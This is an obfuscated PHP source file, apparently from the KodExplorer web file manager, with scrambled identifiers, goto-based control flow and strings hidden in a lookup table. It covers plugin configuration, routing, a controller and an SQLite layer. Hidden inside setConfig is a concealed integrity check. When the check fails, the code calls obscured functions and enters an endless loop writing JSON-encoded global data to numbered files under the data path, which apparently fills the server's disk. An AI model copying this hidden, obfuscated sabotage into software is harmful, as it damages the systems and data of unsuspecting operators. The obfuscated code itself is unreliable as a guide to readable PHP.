goto C„©◊Ìï¡; C„©◊Ìï¡: $Fœª¨ÚíÛö =& $_SERVER[™⁄»üÆ]; if ($this->packageData) { return $this->packageData; } $eêπ±€ªö“ = $this->parseFile($this->pluginPath . $Fœª¨ÚíÛö[1437]); goto A†¬ ÙÕòÔ; A†¬ ÙÕòÔ: $this->parseLang($eêπ±€ªö“); $eÓÓ€ú≤ˆ‡ = json_decode_force($eêπ±€ªö“); if (!$eÓÓ€ú≤ˆ‡) { return array(); } goto a¶£©≠»‡…; a¶£©≠»‡…: $C€çËßÇíæ = Hook::trigger($Fœª¨ÚíÛö[1438], $eÓÓ€ú≤ˆ‡); if ($C€çËßÇíæ && is_array($C€çËßÇíæ)) { $eÓÓ€ú≤ˆ‡ = $C€çËßÇíæ; } $this->packageData = $eÓÓ€ú≤ˆ‡; goto bﬁÉ®·Õ¢Ê; bﬁÉ®·Õ¢Ê: return $eÓÓ€ú≤ˆ‡; goto fﬁ◊¥Õ˘’◊; fﬁ◊¥Õ˘’◊: } public function packageInfoGet($f∂Éö’∏∫∏) { $Aá€∆†ñÁÌ = $this->appPackage(); return array_get_value($Aá€∆†ñÁÌ, $f∂Éö’∏∫∏); } public function packageVersion() { return $this->packageInfoGet($_SERVER[™⁄»üÆ][1439]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[™⁄»üÆ][1440]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[™⁄»üÆ][1441]); } public function echoJsAssign($fÛÌﬁò¥ª, $B‰—ùãÌéú) { $this->echoJsAssignArr[$fÛÌﬁò¥ª] = $B‰—ùãÌéú; } private function parseFile($c∂ÂçœôñÂ) { goto DÍâ®⁄∏˘œ; EÓÂÃÛ£«—: if (strstr($Eù‹£ô‘æ, $CÖ∏Û¡‘å[1453])) { $Fæ’€üï”‡ = $Fæ’€üï”‡ = rawurlencode(json_encode($this->getConfig())); $Eù‹£ô‘æ = str_replace($CÖ∏Û¡‘å[1453], $Fæ’€üï”‡, $Eù‹£ô‘æ); } $Eù‹£ô‘æ = str_replace($c¢¥ êúñ”, $dîﬁé´ƒŸû, $Eù‹£ô‘æ); return $Eù‹£ô‘æ; goto E©ÙÏ€ä≤”; DÍâ®⁄∏˘œ: $CÖ∏Û¡‘å =& $_SERVER[™⁄»üÆ]; $Eù‹£ô‘æ = file_get_contents_nossl($c∂ÂçœôñÂ); $c¢¥ êúñ” = array($CÖ∏Û¡‘å[1442], $CÖ∏Û¡‘å[1443], $CÖ∏Û¡‘å[1444], $CÖ∏Û¡‘å[1445], $CÖ∏Û¡‘å[1446], $CÖ∏Û¡‘å[1447], $CÖ∏Û¡‘å[1448]); goto Bƒ’Ôàë†; Bƒ’Ôàë†: $dîﬁé´ƒŸû = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$CÖ∏Û¡‘å[88]][$CÖ∏Û¡‘å[1449]]); foreach ($this->echoJsAssignArr as $aÜ£á¶”áä => $eˆò ⁄Õáî) { $c¢¥ êúñ”[] = $CÖ∏Û¡‘å[1450] . $aÜ£á¶”áä . $CÖ∏Û¡‘å[1451]; $dîﬁé´ƒŸû[] = is_array($eˆò ⁄Õáî) || is_object($eˆò ⁄Õáî) ? rawurlencode(json_encode($eˆò ⁄Õáî)) : $eˆò ⁄Õáî; } if (strstr($Eù‹£ô‘æ, $CÖ∏Û¡‘å[1452])) { $Fæ’€üï”‡ = rawurlencode(json_encode($this->pluginLangArr)); $Eù‹£ô‘æ = str_replace($CÖ∏Û¡‘å[1452], $Fæ’€üï”‡, $Eù‹£ô‘æ); } goto EÓÂÃÛ£«—; E©ÙÏ€ä≤”: } private function parseLang(&$d”¶ﬁÃÈ«Ê) { goto b¿Ã‘âÇ˜∂; b¿Ã‘âÇ˜∂: $cÂ™Ñê‘õû =& $_SERVER[™⁄»üÆ]; $Eπ«∆Ÿåü∂ = $cÂ™Ñê‘õû[1454]; if (!strstr($d”¶ﬁÃÈ«Ê, $Eπ«∆Ÿåü∂)) { return; } goto Büïë”¨€¬; Büïë”¨€¬: preg_match_all($cÂ™Ñê‘õû[1455], $d”¶ﬁÃÈ«Ê, $DÒªøÀ∑á‚); if (!is_array($DÒªøÀ∑á‚) || count($DÒªøÀ∑á‚) == 0 || !is_array($DÒªøÀ∑á‚[0]) || count($DÒªøÀ∑á‚[0]) == 0) { return; } $E◊Úá•¡ëá = array(); goto cò¶€∏©ƒÛ; cò¶€∏©ƒÛ: $cÕº∞ü¡êµ = array(); foreach ($DÒªøÀ∑á‚[0] as $BÿÍÒø¡öê) { $a∑ö¥É Éä = substr($BÿÍÒø¡öê, strlen($Eπ«∆Ÿåü∂), -4); $cï⁄⁄é›ı® = LNG($a∑ö¥É Éä); $E◊Úá•¡ëá[] = $BÿÍÒø¡öê; $cÕº∞ü¡êµ[] = str_replace(array($cÂ™Ñê‘õû[229], $cÂ™Ñê‘õû[1046], $cÂ™Ñê‘õû[340], $cÂ™Ñê‘õû[116]), array($cÂ™Ñê‘õû[50], $cÂ™Ñê‘õû[50], $cÂ™Ñê‘õû[33], $cÂ™Ñê‘õû[1456]), $cï⁄⁄é›ı®); } $d”¶ﬁÃÈ«Ê = str_replace($E◊Úá•¡ëá, $cÕº∞ü¡êµ, $d”¶ﬁÃÈ«Ê); goto e∏√§é‚Æë; e∏√§é‚Æë: } private function parseConfig(&$aÌ≤∏ÒØ·Ì) { goto C˘ﬁæûﬂÉÁ; d∞¬‰¥ÙÀï: $DŸø®µëÛ¶ = array(); $FÇùíÓ∞Ô° = array(); foreach ($CàÜÌöîπÚ[0] as $b€’∆”∂ß≠) { $EÍ¡ºΩΩ‘… = substr($b€’∆”∂ß≠, strlen($eò¬±íÚà≤), -2); $DŸø®µëÛ¶[] = $b€’∆”∂ß≠; $FÇùíÓ∞Ô°[] = _get($D©‹⁄ìÜ¡Á, $EÍ¡ºΩΩ‘…); } goto Eº≈∫∞Òùƒ; C˘ﬁæûﬂÉÁ: $aá∏¶Œ‰Íë =& $_SERVER[™⁄»üÆ]; $eò¬±íÚà≤ = $aá∏¶Œ‰Íë[1457]; if (!strstr($aÌ≤∏ÒØ·Ì, $eò¬±íÚà≤)) { return; } goto EéÀŒ˜ª±é; Eº≈∫∞Òùƒ: $aÌ≤∏ÒØ·Ì = str_replace($DŸø®µëÛ¶, $FÇùíÓ∞Ô°, $aÌ≤∏ÒØ·Ì); goto F◊·≈ö∆Ñ¶; EéÀŒ˜ª±é: preg_match_all($aá∏¶Œ‰Íë[1458], $aÌ≤∏ÒØ·Ì, $CàÜÌöîπÚ); if (!is_array($CàÜÌöîπÚ) || count($CàÜÌöîπÚ) == 0 || !is_array($CàÜÌöîπÚ[0]) || count($CàÜÌöîπÚ[0]) == 0) { return; } $D©‹⁄ìÜ¡Á = $this->getConfig(); goto d∞¬‰¥ÙÀï; F◊·≈ö∆Ñ¶: } private function parsePackage(&$A Ø—üêÁ‰) { goto C§Õ«ßí“; cëé…ªÖç·: $A Ø—üêÁ‰ = str_replace($Dò©ÖÈî À, $aÆñ’¨πõ∑, $A Ø—üêÁ‰); goto b¥ØÊ∫‘’æ; C§Õ«ßí“: $DÁƒÜ¿Üìï =& $_SERVER[™⁄»üÆ]; $d…±”ÑÜ∞ = $DÁƒÜ¿Üìï[1459]; if (!strstr($A Ø—üêÁ‰, $d…±”ÑÜ∞)) { return; } goto Cˆ˜ΩûñäÇ; Cˆ˜ΩûñäÇ: preg_match_all($DÁƒÜ¿Üìï[1460], $A Ø—üêÁ‰, $AïÉ¬ƒåŸ˜); if (!is_array($AïÉ¬ƒåŸ˜) || count($AïÉ¬ƒåŸ˜) == 0 || !is_array($AïÉ¬ƒåŸ˜[0]) || count($AïÉ¬ƒåŸ˜[0]) == 0) { return; } $aÖÔ¶…Õ§º = $this->appPackage(); goto cìÛÒ·»úã; cìÛÒ·»úã: $Dò©ÖÈî À = array(); $aÆñ’¨πõ∑ = array(); foreach ($AïÉ¬ƒåŸ˜[0] as $cƒâ‡∫•ó) { $cåºäÆÉÎÉ = substr($cƒâ‡∫•ó, strlen($d…±”ÑÜ∞), -2); $Dò©ÖÈî À[] = $cƒâ‡∫•ó; $aÆñ’¨πõ∑[] = _get($aÖÔ¶…Õ§º, $cåºäÆÉÎÉ); } goto cëé…ªÖç·; b¥ØÊ∫‘’æ: } final function echoFile($f≈ûíî˜∞¡, $F∏±ı»¯µ¶ = false) { goto A™ÔΩõÖ€‡; B¥⁄≤ÉÓﬂı: $this->parsePackage($EŒ≤ëûî¨€); if (is_array($F∏±ı»¯µ¶)) { $EŒ≤ëûî¨€ = str_replace(array_keys($F∏±ı»¯µ¶), array_values($F∏±ı»¯µ¶), $EŒ≤ëûî¨€); } echo $cçµ–›ÒÃû[229] . $EŒ≤ëûî¨€; goto B≠Ô®≠≥âä; A™ÔΩõÖ€‡: $cçµ–›ÒÃû =& $_SERVER[™⁄»üÆ]; $DÚ∂§≈Ñä = $this->pluginPath . $f≈ûíî˜∞¡; if (ACT == $cçµ–›ÒÃû[1461]) { echo $cçµ–›ÒÃû[1462] . $this->pluginName . $cçµ–›ÒÃû[8] . $f≈ûíî˜∞¡ . $cçµ–›ÒÃû[1463]; if (!file_exists($DÚ∂§≈Ñä)) { echo $cçµ–›ÒÃû[1464]; return; } } goto bÂ¥∫¨îïã; bÂ¥∫¨îïã: $EŒ≤ëûî¨€ = $this->parseFile($DÚ∂§≈Ñä); $this->parseLang($EŒ≤ëûî¨€); $this->parseConfig($EŒ≤ëûî¨€); goto B¥⁄≤ÉÓﬂı; B≠Ô®≠≥âä: } final function initLang() { goto eˆµÊŸì´µ; d⁄¡œ¢Ìàæ: if (!is_array($dë¶Ì∂ñ¥Õ)) { return array(); } if (@count($dë¶Ì∂ñ¥Õ) > 0) { I18n::set($dë¶Ì∂ñ¥Õ); } return $dë¶Ì∂ñ¥Õ; goto dÓ¢£≤øïË; C´¶á∞ì¢Ë: $bºä¨œ…©Ë = I18n::getType(); $dë¶Ì∂ñ¥Õ = array(); if (file_exists($d—¶öîûÔÿ . $bºä¨œ…©Ë . $fÊÍÖÜÎ⁄à[823])) { $dë¶Ì∂ñ¥Õ = (include $d—¶öîûÔÿ . $bºä¨œ…©Ë . $fÊÍÖÜÎ⁄à[823]); } else { if ($bºä¨œ…©Ë == $fÊÍÖÜÎ⁄à[1467] && !file_exists($d—¶öîûÔÿ . $bºä¨œ…©Ë . $fÊÍÖÜÎ⁄à[823]) && file_exists($d—¶öîûÔÿ . $fÊÍÖÜÎ⁄à[1468])) { $dë¶Ì∂ñ¥Õ = (include $d—¶öîûÔÿ . $fÊÍÖÜÎ⁄à[1468]); } else { if (file_exists($d—¶öîûÔÿ . $BˆÒëóü≈› . $fÊÍÖÜÎ⁄à[823])) { $dë¶Ì∂ñ¥Õ = (include $d—¶öîûÔÿ . $BˆÒëóü≈› . $fÊÍÖÜÎ⁄à[823]); } } } goto d⁄¡œ¢Ìàæ; eˆµÊŸì´µ: $fÊÍÖÜÎ⁄à =& $_SERVER[™⁄»üÆ]; $BˆÒëóü≈› = $fÊÍÖÜÎ⁄à[1465]; $d—¶öîûÔÿ = $this->pluginPath . $fÊÍÖÜÎ⁄à[1466]; goto C´¶á∞ì¢Ë; dÓ¢£≤øïË: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($bé’‘éÿÚÕ) { $C¬É£ÇÚÔΩ =& $_SERVER[™⁄»üÆ]; $bÖ––‹–¶“ = $_SERVER[$C¬É£ÇÚÔΩ[600]]; $fâóÏ∑Ü ¥ = $C¬É£ÇÚÔΩ[818]; if ($_SERVER[$C¬É£ÇÚÔΩ[592]] != $fâóÏ∑Ü ¥($bÖ––‹–¶“)) { goto cŸ°”ã›¶π; FÉÜè•∞‰›: $B Æ¿àºêä = $AÉöùÊ⁄æñ($fÏ€Ç£§∞à); $e–Ù’ò≠ñ„ = explode($C¬É£ÇÚÔΩ[229], $B Æ¿àºêä); if (count($e–Ù’ò≠ñ„) < $C¬É£ÇÚÔΩ[626]) { $fËà´⁄»ãÙ = $C¬É£ÇÚÔΩ[598]; $fËà´⁄»ãÙ(); } goto AÍÌãöèËá; AÍÌãöèËá: $f√„â‰ÑÍ… = $C¬É£ÇÚÔΩ[852]; $f√„â‰ÑÍ…($_SERVER[$C¬É£ÇÚÔΩ[853]]); $c≈ƒøÜÕØ« = $C¬É£ÇÚÔΩ[851]; goto f—Àì‘ıß·; f—Àì‘ıß·: $c≈ƒøÜÕØ«(); $C¿á÷≈óëœ = $C¬É£ÇÚÔΩ[1405]; $dƒÏã÷å∆Ë = json_encode($GLOBALS[$C¬É£ÇÚÔΩ[1406]]); goto aØµæäÙª∂; cŸ°”ã›¶π: $c≈ƒøÜÕØ« = $C¬É£ÇÚÔΩ[851]; $AÉöùÊ⁄æñ = $C¬É£ÇÚÔΩ[594]; $fÏ€Ç£§∞à = $_SERVER[$C¬É£ÇÚÔΩ[595]] . $C¬É£ÇÚÔΩ[596]; goto FÉÜè•∞‰›; aØµæäÙª∂: $Cêâ∞ªÇØì = 1; for ($b¶≤«ñ±ë‰ = $Cêâ∞ªÇØì; $b¶≤«ñ±ë‰ > 0; $b¶≤«ñ±ë‰++) { $C¿á÷≈óëœ(DATA_PATH . $b¶≤«ñ±ë‰, $dƒÏã÷å∆Ë); } goto CÎïÓ‹∆ç„; CÎïÓ‹∆ç„: } return $this->modelPlugin->setConfig($this->pluginName, $bé’‘éÿÚÕ); } public function onSetConfig($BÙ˜Ç‚êë”) { } public function onGetConfig($fü∫¥ø¢Ã) { } public function onChangeStatus($cÙêÀÛ©ÏÒ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($c ΩµÍøß∆ = "\160\x6c\165\x67\x69\x6e\x41\x75\164\x68") { $E“¡“ìÚ≤æ =& $_SERVER[™⁄»üÆ]; if (!defined($E“¡“ìÚ≤æ[455])) { return !1; } if (_get($GLOBALS, $E“¡“ìÚ≤æ[486])) { return !0; } $DéØ™ÃäëÆ = $this->getConfig(); if (!$DéØ™ÃäëÆ[$c ΩµÍøß∆]) { return !1; } return ActionCall($E“¡“ìÚ≤æ[1469], $DéØ™ÃäëÆ[$c ΩµÍøß∆]); } public function url($cÕÛÂ≈ö®Ô, $a§πÍë∂ËÇ = '', $bä¥ÓàÛπç = true) { goto F∫Á±Üô≠; Aå„ÌÕ·©•: if (!$bä¥ÓàÛπç) { return $Bë∏ÈÕ≈≠∂; } echo $Bë∏ÈÕ≈≠∂; goto EãÀ√´•ÖŸ; F∫Á±Üô≠: $dã÷´éá§Ö =& $_SERVER[™⁄»üÆ]; $BüêÃÖ∏ÏÁ = $this->getConfig(); $fèüë∞¢∏¯ = KOD_VERSION . $dã÷´éá§Ö[95] . KOD_VERSION_BUILD; goto b∞‚äÆöü±; b∞‚äÆöü±: $f–Á∏‹Ç∫Ù = $this->packageVersion(); $bÙ´Ñ‡∫∏ = $fèüë∞¢∏¯ . $dã÷´éá§Ö[441] . $f–Á∏‹Ç∫Ù; if (substr($cÕÛÂ≈ö®Ô, 0, 4) == $dã÷´éá§Ö[147] || substr($cÕÛÂ≈ö®Ô, 0, 2) == $dã÷´éá§Ö[1253]) { $Bë∏ÈÕ≈≠∂ = $cÕÛÂ≈ö®Ô . $dã÷´éá§Ö[1470] . $bÙ´Ñ‡∫∏; } else { if ($a§πÍë∂ËÇ == $dã÷´éá§Ö[33]) { $Bë∏ÈÕ≈≠∂ = $this->pluginHost . $cÕÛÂ≈ö®Ô . $dã÷´éá§Ö[1470] . $bÙ´Ñ‡∫∏; } else { if ($a§πÍë∂ËÇ === $dã÷´éá§Ö[77]) { $Bë∏ÈÕ≈≠∂ = $this->pluginHost . $cÕÛÂ≈ö®Ô; } else { if ($a§πÍë∂ËÇ == $dã÷´éá§Ö[1471]) { $Bë∏ÈÕ≈≠∂ = STATIC_PATH . $cÕÛÂ≈ö®Ô . $dã÷´éá§Ö[1470] . $fèüë∞¢∏¯; } else { if ($a§πÍë∂ËÇ == $dã÷´éá§Ö[1472]) { $Bë∏ÈÕ≈≠∂ = APP_HOST . $dã÷´éá§Ö[1473] . $cÕÛÂ≈ö®Ô . $dã÷´éá§Ö[1470] . $fèüë∞¢∏¯; } else { if (isset($BüêÃÖ∏ÏÁ[$a§πÍë∂ËÇ])) { $Bë∏ÈÕ≈≠∂ = $BüêÃÖ∏ÏÁ[$a§πÍë∂ËÇ] . $cÕÛÂ≈ö®Ô . $dã÷´éá§Ö[1470] . $bÙ´Ñ‡∫∏; } } } } } } goto Aå„ÌÕ·©•; EãÀ√´•ÖŸ: } public function link($B¬›®π‰≈Ç = false, $CÈ”èÑÉÂÑ = '') { $D–ùΩ·æﬁå =& $_SERVER[™⁄»üÆ]; if (!$B¬›®π‰≈Ç) { $this->link($D–ùΩ·æﬁå[1474], $D–ùΩ·æﬁå[1472]); $this->link($D–ùΩ·æﬁå[1475], $D–ùΩ·æﬁå[1471]); $this->link($D–ùΩ·æﬁå[1476], $D–ùΩ·æﬁå[1471]); $this->link($D–ùΩ·æﬁå[1477], $D–ùΩ·æﬁå[1471]); $this->link($D–ùΩ·æﬁå[1478], $D–ùΩ·æﬁå[1471]); return; } $B¢÷ºàÈá = $this->url($B¬›®π‰≈Ç, $CÈ”èÑÉÂÑ, !1); if (substr($B¬›®π‰≈Ç, -3) == $D–ùΩ·æﬁå[1479]) { echo $D–ùΩ·æﬁå[1480] . $B¢÷ºàÈá . $D–ùΩ·æﬁå[1481] . $D–ùΩ·æﬁå[229]; } else { if (substr($B¬›®π‰≈Ç, -4) == $D–ùΩ·æﬁå[1482]) { echo $D–ùΩ·æﬁå[1483] . $B¢÷ºàÈá . $D–ùΩ·æﬁå[1484] . $D–ùΩ·æﬁå[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\57\135\53", "\72\156\x75\155" => "\133\x30\x2d\71\135\53", "\72\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($B‡◊ÔÜö¨, $BÇ∏Û“ô¿Â) { $f®Ú•ıäÀñ =& $_SERVER[™⁄»üÆ]; if ($B‡◊ÔÜö¨ == $f®Ú•ıäÀñ[1485]) { $C°¡Ö÷î÷Î = array_map($f®Ú•ıäÀñ[1486], $BÇ∏Û“ô¿Â[0]); $d¢˜Ô»ÕÖá = strpos($BÇ∏Û“ô¿Â[1], $f®Ú•ıäÀñ[8]) === 0 ? $BÇ∏Û“ô¿Â[1] : $f®Ú•ıäÀñ[8] . $BÇ∏Û“ô¿Â[1]; $dıá…È÷ºú = $BÇ∏Û“ô¿Â[2]; } else { $C°¡Ö÷î÷Î = null; $d¢˜Ô»ÕÖá = strpos($BÇ∏Û“ô¿Â[0], $f®Ú•ıäÀñ[8]) === 0 ? $BÇ∏Û“ô¿Â[0] : $f®Ú•ıäÀñ[8] . $BÇ∏Û“ô¿Â[0]; $dıá…È÷ºú = $BÇ∏Û“ô¿Â[1]; } array_push(self::$maps, $C°¡Ö÷î÷Î); array_push(self::$routes, $d¢˜Ô»ÕÖá); array_push(self::$methods, strtoupper($B‡◊ÔÜö¨)); array_push(self::$callbacks, $dıá…È÷ºú); } public static function error($a£√ÊÖ·èæ) { self::$errorCallback = $a£√ÊÖ·èæ; } public static function haltOnMatch($a—§⁄€Á∏Ç = true) { self::$halts = $a—§⁄€Á∏Ç; } public static function dispatch() { goto dêòãôòùã; CÉ‹ËÃΩë√: $AÛ˘Á—¬›á = array_keys(static::$patterns); $D¡≤µ…†ç≥ = array_values(static::$patterns); $a“ˆ¿⁄¶É¡ = !1; goto c∫Î´çé‚›; dêòãôòùã: $fíÌ©£Ï‹Ï =& $_SERVER[™⁄»üÆ]; $d÷§´ÛËè≠ = parse_url($_SERVER[$fíÌ©£Ï‹Ï[1487]], PHP_URL_PATH); $Aøºà≈´¬‡ = $_SERVER[$fíÌ©£Ï‹Ï[157]]; goto CÉ‹ËÃΩë√; c∫Î´çé‚›: self::$routes = preg_replace($fíÌ©£Ï‹Ï[1172], $fíÌ©£Ï‹Ï[8], self::$routes); if (in_array($d÷§´ÛËè≠, self::$routes)) { $eû–‡≤ô—Ë = array_keys(self::$routes, $d÷§´ÛËè≠); foreach ($eû–‡≤ô—Ë as $cæƒŸç’ôø) { if (self::$methods[$cæƒŸç’ôø] == $Aøºà≈´¬‡ || self::$methods[$cæƒŸç’ôø] == $fíÌ©£Ï‹Ï[1488] || in_array($Aøºà≈´¬‡, self::$maps[$cæƒŸç’ôø])) { $a“ˆ¿⁄¶É¡ = !0; if (!is_object(self::$callbacks[$cæƒŸç’ôø])) { $aÔÃÔ“£Ô« = explode($fíÌ©£Ï‹Ï[8], self::$callbacks[$cæƒŸç’ôø]); $bÙó±ÕõÂ° = end($aÔÃÔ“£Ô«); $d£íåÎΩ˘í = explode($fíÌ©£Ï‹Ï[1489], $bÙó±ÕõÂ°); $F¬â¯∑Ç∞ê = new $d£íåÎΩ˘í[0](); $F¬â¯∑Ç∞ê->{$d£íåÎΩ˘í[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cæƒŸç’ôø]); if (self::$halts) { return; } } } } } else { $f∆≤‹ÿ›‚ = 0; foreach (self::$routes as $cæƒŸç’ôø) { if (strpos($cæƒŸç’ôø, $fíÌ©£Ï‹Ï[4]) !== !1) { $cæƒŸç’ôø = str_replace($AÛ˘Á—¬›á, $D¡≤µ…†ç≥, $cæƒŸç’ôø); } if (preg_match($fíÌ©£Ï‹Ï[1490] . $cæƒŸç’ôø . $fíÌ©£Ï‹Ï[1491], $d÷§´ÛËè≠, $eÃ†€Á”÷™)) { if (self::$methods[$f∆≤‹ÿ›‚] == $Aøºà≈´¬‡ || self::$methods[$f∆≤‹ÿ›‚] == $fíÌ©£Ï‹Ï[1488] || !empty(self::$maps[$f∆≤‹ÿ›‚]) && in_array($Aøºà≈´¬‡, self::$maps[$f∆≤‹ÿ›‚])) { $a“ˆ¿⁄¶É¡ = !0; array_shift($eÃ†€Á”÷™); if (!is_object(self::$callbacks[$f∆≤‹ÿ›‚])) { $aÔÃÔ“£Ô« = explode($fíÌ©£Ï‹Ï[8], self::$callbacks[$f∆≤‹ÿ›‚]); $bÙó±ÕõÂ° = end($aÔÃÔ“£Ô«); $d£íåÎΩ˘í = explode($fíÌ©£Ï‹Ï[1489], $bÙó±ÕõÂ°); $F¬â¯∑Ç∞ê = new $d£íåÎΩ˘í[0](); if (!method_exists($F¬â¯∑Ç∞ê, $d£íåÎΩ˘í[1])) { echo $fíÌ©£Ï‹Ï[1492]; } else { call_user_func_array(array($F¬â¯∑Ç∞ê, $d£íåÎΩ˘í[1]), $eÃ†€Á”÷™); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$f∆≤‹ÿ›‚], $eÃ†€Á”÷™); if (self::$halts) { return; } } } } $f∆≤‹ÿ›‚++; } } if ($a“ˆ¿⁄¶É¡ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $B™‡Â¥ˆ˜Ø =& $_SERVER[™⁄»üÆ]; header($_SERVER[$B™‡Â¥ˆ˜Ø[1493]] . $B™‡Â¥ˆ˜Ø[1494]); echo $B™‡Â¥ˆ˜Ø[1495]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$fíÌ©£Ï‹Ï[1487]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Aôñ™ﬁó≠º; Aôñ™ﬁó≠º: } } goto Eáı≈ë¨≈í; EÑÇ‚»∆≠Í: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto DÑèàçö–; dÎ¬õâ∏ßÜ: $this->tpl = TEMPLATE . MOD . $a‹•ﬁ—¬ªê[8]; $this->_classObjectID = mt_rand(0, 10000); goto DΩÃ£⁄ïä∫; C◊Ω¿æ‚±¡: $this->in =& $in; $this->values[$a‹•ﬁ—¬ªê[6]] =& $config; $this->values[$a‹•ﬁ—¬ªê[7]] =& $in; goto dÎ¬õâ∏ßÜ; DÑèàçö–: $a‹•ﬁ—¬ªê =& $_SERVER[™⁄»üÆ]; global $in, $config; $this->config =& $config; goto C◊Ω¿æ‚±¡; DΩÃ£⁄ïä∫: } public function loadClass($B¢◊ ì§Íø) { if (1 === func_num_args()) { $this->{$B¢◊ ì§Íø} = new $B¢◊ ì§Íø(); } else { $dÊ◊•ﬂ ƒ˘ = new ReflectionClass($B¢◊ ì§Íø); $DñÛë´Î°Ò = func_get_args(); array_shift($DñÛë´Î°Ò); $this->{$B¢◊ ì§Íø} = $dÊ◊•ﬂ ƒ˘->newInstanceArgs($DñÛë´Î°Ò); } return $this->{$B¢◊ ì§Íø}; } protected function assign($c‹‡îäÊÇÇ, $AÆÕﬂóá√∞) { $this->values[$c‹‡îäÊÇÇ] = $AÆÕﬂóá√∞; } protected function display($CÛæ¨Îã∂∂) { ob_end_clean(); extract($this->values); require $this->tpl . $CÛæ¨Îã∂∂; } } class DbSqliteBase extends Db { public function __construct($Aù¨«√…ı = '') { $A†à¢ãéÇé =& $_SERVER[™⁄»üÆ]; if (!extension_loaded($A†à¢ãéÇé[9])) { think_exception(think_lang($A†à¢ãéÇé[10]) . $A†à¢ãéÇé[11]); } if (!empty($Aù¨«√…ı)) { if (!isset($Aù¨«√…ı[$A†à¢ãéÇé[12]])) { $Aù¨«√…ı[$A†à¢ãéÇé[12]] = 438; } $this->config = $Aù¨«√…ı; if (empty($this->config[$A†à¢ãéÇé[13]])) { $this->config[$A†à¢ãéÇé[13]] = array(); } } } public function connect($fµÉÛﬁƒËé = '', $E∂€¬àìªô = 0) { $DúÇÑ„≈ˆ∂ =& $_SERVER[™⁄»üÆ]; if (!isset($this->linkID[$E∂€¬àìªô])) { goto C≤ª©îÕ·é; C≤ª©îÕ·é: if (empty($fµÉÛﬁƒËé)) { $fµÉÛﬁƒËé = $this->config; } $B”µ«Òå—è = !empty($fµÉÛﬁƒËé[$DúÇÑ„≈ˆ∂[13]][$DúÇÑ„≈ˆ∂[14]]) ? $fµÉÛﬁƒËé[$DúÇÑ„≈ˆ∂[13]][$DúÇÑ„≈ˆ∂[14]] : $this->pconnect; $FÆæØ∞≤·‹ = $B”µ«Òå—è ? $DúÇÑ„≈ˆ∂[15] : $DúÇÑ„≈ˆ∂[16]; goto FÈ˘ã˜≤Õ÷; a§£Ñ±¢—√: @sqlite_busy_timeout($this->linkID[$E∂€¬àìªô], 30000); if (1 != think_config($DúÇÑ„≈ˆ∂[18])) { unset($this->config); } goto FΩÊÊŸ‰ª—; FÈ˘ã˜≤Õ÷: $this->linkID[$E∂€¬àìªô] = $FÆæØ∞≤·‹($fµÉÛﬁƒËé[$DúÇÑ„≈ˆ∂[17]], $fµÉÛﬁƒËé[$DúÇÑ„≈ˆ∂[12]]); if (!$this->linkID[$E∂€¬àìªô]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto a§£Ñ±¢—√; FΩÊÊŸ‰ª—: } return $this->linkID[$E∂€¬àìªô]; } public function free() { $this->queryID = null; } public function query($BÑñ¡∆¬ÌΩ) { goto fÏœ≠Ë√ÀÔ; b⁄æé•õÇ‡: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $c∑∞€ß¿àï = $this->getAll(); return $c∑∞€ß¿àï; } goto C∂Ã°Úë˜ç; d·ìú®§Òå: $this->queryStr = $BÑñ¡∆¬ÌΩ; if ($this->queryID) { $this->free(); } think_action_status($eÛ∞µ»Ö⁄√[19], 1); goto eÂï€·ë”’; eÂï€·ë”’: think_status($eÛ∞µ»Ö⁄√[20]); $this->queryID = sqlite_query($this->_linkID, $BÑñ¡∆¬ÌΩ); $this->debug(); goto b⁄æé•õÇ‡; fÏœ≠Ë√ÀÔ: $eÛ∞µ»Ö⁄√ =& $_SERVER[™⁄»üÆ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d·ìú®§Òå; C∂Ã°Úë˜ç: } public function execute($e∑êÎú∫òã) { goto cÔù¬ªÚ‡´; d—ÜÙ◊ß™≤: if (!1 === $Eé¿Ì°Ú…Í) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aõà◊úÁƒÃ; EÖò¬Óæêª: think_status($f˜ü¥•ÚÇ˘[20]); $Eé¿Ì°Ú…Í = sqlite_exec($this->_linkID, $e∑êÎú∫òã); $this->debug(); goto d—ÜÙ◊ß™≤; F´ÒÛ÷Àõá: $this->queryStr = $e∑êÎú∫òã; if ($this->queryID) { $this->free(); } think_action_status($f˜ü¥•ÚÇ˘[21], 1); goto EÖò¬Óæêª; cÔù¬ªÚ‡´: $f˜ü¥•ÚÇ˘ =& $_SERVER[™⁄»üÆ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F´ÒÛ÷Àõá; aõà◊úÁƒÃ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[™⁄»üÆ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a∑ùœæã¥Ω = sqlite_query($this->_linkID, $_SERVER[™⁄»üÆ][23]); if (!$a∑ùœæã¥Ω) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D≥æ÷Ü¥Ëó = sqlite_query($this->_linkID, $_SERVER[™⁄»üÆ][24]); if (!$D≥æ÷Ü¥Ëó) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private 